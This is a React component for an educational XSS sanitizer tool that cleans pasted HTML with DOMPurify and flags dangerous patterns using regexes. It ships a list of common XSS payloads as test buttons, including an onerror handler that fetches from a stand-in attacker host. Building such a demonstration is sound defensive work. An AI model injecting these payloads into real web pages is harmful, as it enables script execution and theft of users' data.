'use client'

import { useState } from 'react'
import { Textarea } from '@/components/ui/textarea'
import { Button } from '@/components/ui/button'
import { Badge } from '@/components/ui/badge'
import DOMPurify from 'dompurify'
import { AlertCircle, CheckCircle } from 'lucide-react'

const COMMON_XSS_PAYLOADS = [
  '<script>alert("XSS")</script>',
  '<img src=x onerror=alert("XSS")>',
  '<svg onload=alert("XSS")>',
  '<iframe src="javascript:alert(\'XSS\')"></iframe>',
  '<body onload=alert("XSS")>',
  '<input onfocus=alert("XSS") autofocus>',
  '<marquee onstart=alert("XSS")></marquee>',
  '<details open ontoggle=alert("XSS")>',
  '"><script>alert(String.fromCharCode(88,83,83))</script>',
  '<img src=x onerror="fetch(\'http://attacker.com\')">',
]

export default function XssPayload() {
  const [input, setInput] = useState('')
  const [sanitized, setSanitized] = useState('')
  const [removed, setRemoved] = useState('')

  function sanitize() {
    if (!input.trim()) {
      setSanitized('')
      setRemoved('')
      return
    }

    // Sanitize the input
    const clean = DOMPurify.sanitize(input)
    setSanitized(clean)

    // Show what was removed by comparing
    const temp = document.createElement('div')
    temp.innerHTML = input
    const allContent = temp.textContent || ''

    temp.innerHTML = clean
    const cleanContent = temp.textContent || ''

    // Detect dangerous patterns that were removed
    const dangerous: string[] = []
    const patterns = [
      /<script[^>]*>[\s\S]*?<\/script>/gi,
      /on\w+\s*=\s*["'][^"']*["']/gi,
      /javascript:/gi,
      /<iframe[^>]*>/gi,
      /<object[^>]*>/gi,
      /<embed[^>]*>/gi,
    ]

    patterns.forEach(pattern => {
      const matches = input.match(pattern)
      if (matches) {
        dangerous.push(...matches)
      }
    })

    setRemoved(dangerous.length > 0 ? dangerous.join('\n') : 'No dangerous content detected')
  }

  function testPayload(payload: string) {
    setInput(payload)
    setTimeout(() => {
      sanitize()
    }, 0)
  }

  const isSafe = input === sanitized
  const hasDangerous = removed !== 'No dangerous content detected'

  return (
    <div className="space-y-4">
      <div className="space-y-2">
        <label className="text-sm font-medium">Raw User Input</label>
        <Textarea
          value={input}
          onChange={e => {
            setInput(e.target.value)
            if (e.target.value.trim()) {
              const clean = DOMPurify.sanitize(e.target.value)
              setSanitized(clean)

              const patterns = [
                /<script[^>]*>[\s\S]*?<\/script>/gi,
                /on\w+\s*=\s*["'][^"']*["']/gi,
                /javascript:/gi,
                /<iframe[^>]*>/gi,
              ]

              let dangerous: string[] = []
              patterns.forEach(pattern => {
                const matches = e.target.value.match(pattern)
                if (matches) {
                  dangerous = [...dangerous, ...matches]
                }
              })

              setRemoved(dangerous.length > 0 ? dangerous.join('\n') : 'No dangerous content detected')
            }
          }}
          placeholder="Paste potentially malicious HTML/JavaScript here..."
          className="font-mono text-sm min-h-[150px]"
        />
      </div>

      <Button onClick={sanitize} className="w-full">
        Sanitize & Analyze
      </Button>

      {input && (
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
          <div className="space-y-2">
            <div className="flex items-center justify-between">
              <label className="text-sm font-medium">Sanitized Output</label>
              <Badge className={isSafe ? 'bg-green-100 text-green-800 dark:bg-green-950 dark:text-green-200' : 'bg-red-100 text-red-800 dark:bg-red-950 dark:text-red-200'}>
                {isSafe ? '✓ Safe' : '✗ Threats removed'}
              </Badge>
            </div>
            <Textarea
              value={sanitized}
              readOnly
              className="font-mono text-sm min-h-[200px] bg-muted"
            />
          </div>

          <div className="space-y-2">
            <div className="flex items-center justify-between">
              <label className="text-sm font-medium">Threats Detected</label>
              {hasDangerous ? (
                <AlertCircle className="h-4 w-4 text-red-600" />
              ) : (
                <CheckCircle className="h-4 w-4 text-green-600" />
              )}
            </div>
            <Textarea
              value={removed}
              readOnly
              className={`font-mono text-sm min-h-[200px] ${
                hasDangerous
                  ? 'bg-red-50 dark:bg-red-950 border-red-200 dark:border-red-800'
                  : 'bg-green-50 dark:bg-green-950 border-green-200 dark:border-green-800'
              } border`}
            />
          </div>
        </div>
      )}

      <div className="space-y-2">
        <label className="text-sm font-medium">Test with common XSS payloads:</label>
        <div className="grid grid-cols-1 md:grid-cols-2 gap-2">
          {COMMON_XSS_PAYLOADS.map((payload, i) => (
            <Button
              key={i}
              size="sm"
              variant="outline"
              onClick={() => testPayload(payload)}
              className="text-xs justify-start font-mono truncate"
              title={payload}
            >
              {payload.substring(0, 40)}...
            </Button>
          ))}
        </div>
      </div>

      <div className="rounded-md border bg-blue-50 dark:bg-blue-950 p-3 space-y-2 text-xs text-muted-foreground">
        <p className="font-semibold text-primary">What is XSS?</p>
        <p>
          Cross-Site Scripting (XSS) is a vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. This tool demonstrates how DOMPurify can sanitize potentially dangerous content.
        </p>
        <p className="font-semibold text-primary mt-2">Common XSS vectors:</p>
        <ul className="list-disc list-inside space-y-0.5">
          <li>Script tags with arbitrary JavaScript</li>
          <li>Event handlers (onclick, onerror, etc.)</li>
          <li>JavaScript protocol URLs</li>
          <li>Embedded objects and iframes</li>
        </ul>
      </div>

      {!input && (
        <div className="rounded-md border border-dashed p-8 text-center text-muted-foreground">
          <p>Paste HTML/JavaScript to check for XSS vulnerabilities</p>
        </div>
      )}
    </div>
  )
}
